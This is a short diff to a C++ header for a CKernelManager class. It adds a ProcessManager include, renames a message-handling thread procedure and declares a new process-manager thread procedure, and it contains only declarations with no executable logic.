@@ -4,6 +4,7 @@
 #include"InstantMessageManager.h"
 #include"ProcessHelper.h"
 #include"SystemHelper.h"
+#include"ProcessManager.h"
 class CKernelManager:public CManager
 {
 public:
@@ -15,4 +16,5 @@ private:
 	int    m_ThreadHandleCount;
 };
 
-DWORD WINAPI RemoteMessageProcedure(LPVOID ParameterData);
+DWORD WINAPI InstantMessageProcedure(LPVOID ParameterData);
+DWORD WINAPI ProcessManagerProcedure(LPVOID ParameterData);
